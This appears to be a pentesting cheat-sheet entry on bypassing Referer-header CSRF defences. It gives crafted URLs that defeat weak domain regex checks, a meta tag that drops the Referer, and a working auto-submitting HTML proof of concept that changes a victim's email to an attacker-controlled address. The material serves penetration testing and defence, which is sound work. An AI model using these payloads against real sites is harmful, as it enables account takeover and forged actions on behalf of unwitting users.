Some applications make use of the HTTP `Referer` header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. The following are possible bypasses for the `Referer` header based CSRF protection.

<br/>

**1) Check for Bad Regex**<br/>
Some websites will use regex to check if the website is contained in the referer. This regex could be broken. 

*Subdomain*
```
https://target.com.shelled.io/change_email
```

*Query*
```
https://shelled.io/change_email?target.com
```

<br/>
<br/>

**2) Check for referer Removed**<br/>
Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted. The following code will drop the referer header.
```
<meta name="referrer" content="never">
```

<br/>

*PoC*
```
<html>
    <body>
        <meta name="referrer" content="never">
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
